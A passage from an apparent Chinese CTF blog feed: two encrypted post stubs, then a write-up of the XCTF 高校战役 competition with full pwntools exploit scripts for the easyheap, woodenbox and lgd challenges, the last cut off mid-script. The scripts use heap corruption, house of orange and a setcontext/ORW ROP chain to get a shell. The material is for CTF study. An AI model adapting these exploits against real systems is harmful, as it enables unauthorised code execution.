&lt;p&gt;这一道题还是我学弟运气好，碰出来的，vector容器free的时候，可以double free。&lt;/p&gt;
&lt;figure class=&quot;highligh
      
    
    </summary>
    
    
      <category term="Writeup" scheme="http://Whali3n51.top/categories/Writeup/"/>
    
    
      <category term="double_free" scheme="http://Whali3n51.top/tags/double-free/"/>
    
  </entry>
  
  <entry>
    <title>CTF中linux_kernel_pwn本地环境快速部署</title>
    <link href="http://whali3n51.top/2020/03/29/CTF%E4%B8%ADlinux_kernel_pwn%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2/"/>
    <id>http://whali3n51.top/2020/03/29/CTF%E4%B8%ADlinux_kernel_pwn%E6%9C%AC%E5%9C%B0%E7%8E%AF%E5%A2%83%E5%BF%AB%E9%80%9F%E9%83%A8%E7%BD%B2/</id>
    <published>2020-03-29T03:21:38.000Z</published>
    <updated>2020-03-30T05:43:16.049Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章。</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d15623faa7970d0a6598540fe8df01ac388165e186400e340a151e80bd3b43ee"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章，内容可能是个人情感宣泄或者收费技术。如果你确实想看，请与我联系。
    
    </summary>
    
    
    
      <category term="linux_kernel" scheme="http://Whali3n51.top/tags/linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>glibc2.29和glibc2.30下的新的利用方式--tcache_stashing_unlink_attack_plus</title>
    <link href="http://whali3n51.top/2020/03/11/glibc2-29%E5%92%8Cglibc2-30%E4%B8%8B%E7%9A%84%E6%96%B0%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-tcache-stashing-unlink-attack-plus/"/>
    <id>http://whali3n51.top/2020/03/11/glibc2-29%E5%92%8Cglibc2-30%E4%B8%8B%E7%9A%84%E6%96%B0%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F-tcache-stashing-unlink-attack-plus/</id>
    <published>2020-03-11T06:11:56.000Z</published>
    <updated>2020-06-04T09:03:53.165Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章。</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="5e9cc0347097238f802700125ffd25d0aab51f26bfe0bb6ff0f9c19b561dafcd"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章，内容可能是个人情感宣泄或者收费技术。如果你确实想看，请与我联系。
    
    </summary>
    
    
      <category term="pwn学习" scheme="http://Whali3n51.top/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="tcache_stashing_unlink_attack_plus" scheme="http://Whali3n51.top/tags/tcache-stashing-unlink-attack-plus/"/>
    
  </entry>
  
  <entry>
    <title>xctf_高校战役公益赛</title>
    <link href="http://whali3n51.top/2020/03/11/xctf-%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9%E5%85%AC%E7%9B%8A%E8%B5%9B/"/>
    <id>http://whali3n51.top/2020/03/11/xctf-%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9%E5%85%AC%E7%9B%8A%E8%B5%9B/</id>
    <published>2020-03-11T03:17:35.000Z</published>
    <updated>2020-04-15T02:21:41.585Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="summary">summary</span></h2><p>这次比赛总的来说发挥还算不错，虽然没有抢到一血，但是至少做出题目了。对kernel题目来说不太熟练，甚至是有点忘了怎么去做了，有时间了一定要多多熟练kernel的利用，不过这次的每道kernel都有非预期，有点无脑。最后还有一个towchunk的利用，放到后面一篇文章专门讲解。那是一个新的利用技术。最后吐槽一下，这次赛题太多了，肝死我，不过好在肝到了一个养生壶，美滋滋。</p><p><img src="./gift.png" alt></p><h2><span id="easyheap">easyheap</span></h2><p>这道题真的卡了我好久，我就没有看出这里的逻辑漏洞，真是想当然的认为在错误了之后就把堆块给free了。</p><p>真是吃到了开发功底不扎实的亏啊。</p><p><img src="./4.png" alt="img">      </p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'easyheap'</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.debug_remote_libc =<span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'121.36.209.145'</span>,<span class="number">9997</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0x0000000000400B1E</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0x0000000000400B1E</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">sla(<span class="string">"Your choice:\n"</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"How long is this message?\n"</span>,size)</span><br><span class="line">sa(<span class="string">"What is the content of the message?\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">sla(<span class="string">"Your choice:"</span>,<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">"What is the index of the item to be modified?\n"</span>,index)</span><br><span class="line">sa(<span class="string">"What is the content of the message?\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"Your choice:"</span>,<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"What is the index of the item to be deleted?\n"</span>,index)</span><br><span class="line">choice()</span><br><span class="line">create(<span class="number">0x18</span>,p64(<span class="number">0x602018</span>)+p64(<span class="number">0x200</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">sla(<span class="string">"Your choice:\n"</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"How long is this message?\n"</span>,str(<span class="number">0x500</span>))</span><br><span class="line">sla(<span class="string">"Your choice:\n"</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"How long is this message?\n"</span>,str(<span class="number">0x500</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x6020d8</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x6020e8</span>)+p64(<span class="number">0x6020f8</span>)+p64(<span class="number">0x602018</span>)+p64(<span class="number">0x200</span>)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x602018</span>))</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x0400670</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x602080</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">stdout=uu64(r(<span class="number">6</span>))</span><br><span class="line">libc_base=stdout-(<span class="number">0x7ffff7dd2620</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">system=libc_base+libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">edit(<span class="number">3</span>,p64(system))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p><img src="./5.png" alt="img">      </p><h2><span id="woodenbox">woodenbox</span></h2><p>这个题目就比较简单，就是简单的堆溢出，我为了图方便，不想那么麻烦的攻击__free_hook，直接用来house of orange来getshell。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from PwnContext import *</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;splitw&apos;, &apos;-h&apos;]</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">s       = lambda data               :ctx.send(str(data))        #in case that data is an int</span><br><span class="line">sa      = lambda delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = lambda data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = lambda delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = lambda numb=4096          :ctx.recv(numb)</span><br><span class="line">ru      = lambda delims, drop=True  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = lambda                    :ctx.interactive()</span><br><span class="line">rs      = lambda *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = lambda gs=&apos;&apos;, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"># misc functions</span><br><span class="line">uu32    = lambda data   :u32(data.ljust(4, &apos;\x00&apos;))</span><br><span class="line">uu64    = lambda data   :u64(data.ljust(8, &apos;\x00&apos;))</span><br><span class="line">leak    = lambda name,addr :log.success(&apos;&#123;&#125; = &#123;:#x&#125;&apos;.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = &apos;woodenbox2&apos;</span><br><span class="line">libc =ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.debug_remote_libc = False</span><br><span class="line">local=0</span><br><span class="line">def choice():</span><br><span class="line">if(local):</span><br><span class="line">p=rs()</span><br><span class="line">else:</span><br><span class="line">ctx.remote = (&apos;121.36.215.224&apos;,9998)</span><br><span class="line">p=rs(&apos;remote&apos;)</span><br><span class="line">return p</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line">print hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;&apos;sym1&apos;:0xEDA , &apos;sym2&apos;:0x10AF&#125;</span><br><span class="line">ctx.breakpoints = [0xEDA,0x10AF]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def create(size,content):</span><br><span class="line">sla(&quot;Your choice:&quot;,1)</span><br><span class="line">sla(&quot;Please enter the length of item name:&quot;,size)</span><br><span class="line">sa(&quot;Please enter the name of item:&quot;,content)</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">sla(&quot;Your choice:&quot;,2)</span><br><span class="line">sla(&quot;Please enter the index of item:&quot;,index)</span><br><span class="line">sla(&quot;Please enter the length of item name:&quot;,size)</span><br><span class="line">sa(&quot;Please enter the new name of the item:&quot;,content)</span><br><span class="line">def free(index):</span><br><span class="line">sla(&quot;Your choice:&quot;,3)</span><br><span class="line">sla(&quot;Please enter the index of item:&quot;,index)</span><br><span class="line">choice()</span><br><span class="line">create(0xf8,&quot;a&quot;*0x20)</span><br><span class="line">create(0x68,&quot;a&quot;*0x20)</span><br><span class="line">create(0xf8,&quot;a&quot;*0x20)</span><br><span class="line">create(0x18,&quot;a&quot;*0x10)</span><br><span class="line">free(0)</span><br><span class="line">edit(0,0x70,&quot;f&quot;*0x60+p64(0x170)+p64(0x100))</span><br><span class="line">free(0)</span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">create(0xf8,&quot;a&quot;*0x20)</span><br><span class="line">create(0x58,&quot;\xdd\x25&quot;)</span><br><span class="line">create(0xf8,&quot;a&quot;*0x20)</span><br><span class="line">edit(1,0x100,0xf0*&apos;w&apos;+p64(0)+p64(0x70))</span><br><span class="line">create(0x68,&quot;a&quot;*0x20)</span><br><span class="line">create(0x68,&quot;\x00&quot;*0x33+p64(0xfbad1800)+p64(0)*3+&apos;\x88&apos;)</span><br><span class="line">libc_base=uu64(r(6))-(0x7ffff7dd18e0-0x7ffff7a0d000)</span><br><span class="line">leak(&quot;libc_base&quot;,libc_base)</span><br><span class="line">_IO_list_all=libc_base+libc.symbols[&apos;_IO_list_all&apos;]</span><br><span class="line">fake_file=p64(0)+p64(0x61)</span><br><span class="line">fake_file+=p64(0)+p64(_IO_list_all-0x10)</span><br><span class="line">fake_file+=p64(1)+p64(2)</span><br><span class="line">fake_file+=p64(0)+p64(libc_base+0x18cd57)</span><br><span class="line">fake_file=fake_file.ljust(0xd8,&quot;\x00&quot;)</span><br><span class="line">fake_file+=p64(libc_base+0x3c37a0-8)</span><br><span class="line">fake_file+=p64(0)</span><br><span class="line">fake_file+=p64(libc_base+libc.symbols[&apos;system&apos;])</span><br><span class="line">free(3)</span><br><span class="line">edit(1,0x50+len(fake_file),0x50*&apos;a&apos;+fake_file)</span><br><span class="line">sla(&quot;Your choice:&quot;,1)</span><br><span class="line">sla(&quot;Please enter the length of item name:&quot;,str(0x100))</span><br><span class="line">#debug()</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>​        <img src="./6.png" alt="img">      </p><h2><span id="lgd">lgd</span></h2><p>堆溢出，首先用fast bin attack攻击bss段修改指针，然后修改__free_hook为setcontext,最后劫持栈和rip。最后使用ORW的ROP，最后拿到flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PwnContext <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :ctx.send(str(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :ctx.sendline(str(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :ctx.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :ctx.recvuntil(delims, drop)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :ctx.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)</span><br><span class="line"><span class="comment"># misc functions</span></span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'lgd'</span></span><br><span class="line"><span class="comment">#ctx.remote_libc = './libc.so'</span></span><br><span class="line">libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">ctx.debug_remote_libc = <span class="literal">False</span></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">if</span>(local):</span><br><span class="line">p=rs()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">ctx.remote = (<span class="string">'121.36.209.145'</span>,<span class="number">9998</span>)</span><br><span class="line">p=rs(<span class="string">'remote'</span>)</span><br><span class="line"><span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">libc_base = ctx.bases.libc</span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line">ctx.symbols = &#123;<span class="string">'sym1'</span>:<span class="number">0x0401A97</span>&#125;</span><br><span class="line">ctx.breakpoints = [<span class="number">0x0401A97</span>]</span><br><span class="line">ctx.debug()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="number">1</span>)</span><br><span class="line">sla(<span class="string">"__?\n"</span>,size)</span><br><span class="line">sa(<span class="string">"or_no?\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="number">3</span>)</span><br><span class="line">sla(<span class="string">"ex ?\n"</span>,index)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">"ex ?\n"</span>,index)</span><br><span class="line">sa(<span class="string">"tent ?\n"</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"&gt;&gt; "</span>,<span class="number">2</span>)</span><br><span class="line">sla(<span class="string">"ex ?\n"</span>,index)</span><br><span class="line">choice()</span><br><span class="line">sla(<span class="string">" name? \n"</span>,<span class="string">"whali3n51"</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0x58</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">"f"</span>*<span class="number">0x50</span>+p64(<span class="number">0x160</span>)+p64(<span class="number">0x100</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base=uu64(r(<span class="number">6</span>))-(<span class="number">0x7fb8d44feb78</span><span class="number">-0x7fb8d413a000</span>)</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">create(<span class="number">0x58</span>,<span class="string">"a"</span>*<span class="number">0x200</span>)</span><br><span class="line">create(<span class="number">0xf8</span>,<span class="string">"a"</span>*<span class="number">0x1f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x60</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x603250</span>))</span><br><span class="line">create(<span class="number">0x58</span>,<span class="string">"a"</span>*<span class="number">0x100</span>)</span><br><span class="line">create(<span class="number">0x58</span>,<span class="number">0x1f0</span>*<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">5</span>,p32(<span class="number">0x200</span>)*<span class="number">8</span>*<span class="number">4</span>+p64(libc_base+libc.symbols[<span class="string">"__free_hook"</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+libc.symbols[<span class="string">"setcontext"</span>]+<span class="number">0x35</span>))</span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rax = <span class="number">0</span></span><br><span class="line">frame.rsi = (libc_base + libc.symbols[<span class="string">'__free_hook'</span>])</span><br><span class="line">frame.rcx = (libc_base + libc.symbols[<span class="string">'__free_hook'</span>])</span><br><span class="line">frame.rdx = <span class="number">0x2000</span></span><br><span class="line">frame.rsp = (libc_base + libc.symbols[<span class="string">'__free_hook'</span>])</span><br><span class="line">frame.rip = libc_base + <span class="number">0x00000000000bc375</span> <span class="comment">#: syscall; ret; </span></span><br><span class="line">payload = str(frame)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">poprdi=libc_base+<span class="number">0x0000000000021102</span></span><br><span class="line">flag_addr=libc_base + libc.symbols[<span class="string">'__free_hook'</span>]+<span class="number">15</span>*<span class="number">8</span></span><br><span class="line">poprsi=libc_base+<span class="number">0x00000000000202e8</span></span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">poprdx=libc_base+<span 